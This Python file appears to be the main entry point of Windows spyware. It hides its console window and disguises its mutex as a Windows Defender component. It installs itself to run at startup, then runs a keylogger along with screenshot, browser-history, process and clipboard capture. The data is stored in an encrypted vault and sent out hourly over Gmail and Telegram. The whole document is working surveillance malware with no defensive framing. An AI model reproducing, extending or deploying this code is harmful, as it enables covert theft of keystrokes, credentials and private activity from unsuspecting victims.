# main.py — agent entry point
# Runs silently on boot, collects activity, stores encrypted in vault
# Sends hourly reports via Gmail and Telegram

import ctypes, sys, time
from pathlib import Path

# ── HIDE CONSOLE WINDOW IMMEDIATELY ──────────────────────────────────────────
def _hide():
    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    if hwnd:
        ctypes.windll.user32.ShowWindow(hwnd, 0)

_hide()

# ── IMPORTS ───────────────────────────────────────────────────────────────────
import config
from vault.vault_manager import (
    init_vault, vault_write, vault_write_screenshot,
    vault_read_all, vault_read_screenshot
)
from modules import keylogger, screenshot, browser_history, process_tracker, clipboard
from modules.delivery import email_delivery, telegram_delivery
from persistence.startup import install

# ── SINGLE INSTANCE CHECK ─────────────────────────────────────────────────────
import win32event, win32api, winerror

MUTEX_NAME = "Global\\WindowsDefenderCacheMutex"
mutex = win32event.CreateMutex(None, False, MUTEX_NAME)
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    sys.exit(0)

# ── VAULT INIT ────────────────────────────────────────────────────────────────
vault_dir = config.VAULT_DIR
key       = init_vault(vault_dir, config.VAULT_PASSWORD)

# ── PERSISTENCE ───────────────────────────────────────────────────────────────
install()

# ── SCREENSHOT BUFFER (last N kept for delivery) ─────────────────────────────
_recent_screenshots = []   # list of (filename, png_bytes) — last 5 kept in memory
_MAX_SS_MEMORY = 5

# ── CALLBACKS ─────────────────────────────────────────────────────────────────

def on_keylog(text: str):
    vault_write(vault_dir, key, "keylog", text)

def on_screenshot(png_bytes: bytes):
    from datetime import datetime
    fname = datetime.utcnow().strftime("%Y%m%d_%H%M%S") + ".png"
    vault_write_screenshot(vault_dir, key, png_bytes)
    _recent_screenshots.append((fname, png_bytes))
    if len(_recent_screenshots) > _MAX_SS_MEMORY:
        _recent_screenshots.pop(0)

def on_browser(text: str):
    vault_write(vault_dir, key, "browser", text)

def on_process(text: str):
    vault_write(vault_dir, key, "process", text)

def on_clipboard(text: str):
    vault_write(vault_dir, key, "clipboard", text)

# ── START COLLECTION MODULES ──────────────────────────────────────────────────

if config.ENABLE_KEYLOGGER:
    keylogger.start(on_keylog, flush_interval=config.LOG_FLUSH_INTERVAL_SECONDS)

if config.ENABLE_SCREENSHOTS:
    screenshot.start(on_screenshot, interval=config.SCREENSHOT_INTERVAL_SECONDS)

if config.ENABLE_BROWSER_HISTORY:
    browser_history.start(on_browser, interval=config.BROWSER_CHECK_INTERVAL_SECONDS)

if config.ENABLE_PROCESS_TRACKER:
    process_tracker.start(on_process, interval=10)

if config.ENABLE_CLIPBOARD:
    clipboard.start(on_clipboard, interval=3)

# ── DELIVERY LOOP ─────────────────────────────────────────────────────────────

import threading
from datetime import datetime, timedelta

def delivery_loop():
    """Every DELIVERY_INTERVAL_SECONDS, send report via all enabled channels."""
    while True:
        time.sleep(config.DELIVERY_INTERVAL_SECONDS)
        try:
            # Pull entries from last interval period
            since   = datetime.utcnow() - timedelta(seconds=config.DELIVERY_INTERVAL_SECONDS + 60)
            entries = vault_read_all(vault_dir, key)
            # Filter to recent entries only
            recent  = [e for e in entries
                       if datetime.fromisoformat(e["ts"]) >= since]

            screenshots = list(_recent_screenshots)   # snapshot

            # Gmail
            if config.ENABLE_EMAIL:
                body = email_delivery.build_report_text(recent)
                email_delivery.send_report(
                    email_from     = config.EMAIL_FROM,
                    email_password = config.EMAIL_PASSWORD,
                    email_to       = config.EMAIL_TO,
                    subject_prefix = config.EMAIL_SUBJECT_PREFIX,
                    text_body      = body,
                    screenshots    = screenshots[-3:] if screenshots else None
                )

            # Telegram
            if config.ENABLE_TELEGRAM:
                telegram_delivery.send_report(
                    token       = config.TELEGRAM_BOT_TOKEN,
                    chat_id     = config.TELEGRAM_CHAT_ID,
                    entries     = recent,
                    screenshots = screenshots[-3:] if screenshots else None
                )

        except Exception:
            pass

t_delivery = threading.Thread(target=delivery_loop, daemon=True)
t_delivery.start()

# ── KEEP ALIVE ────────────────────────────────────────────────────────────────
while True:
    time.sleep(60)
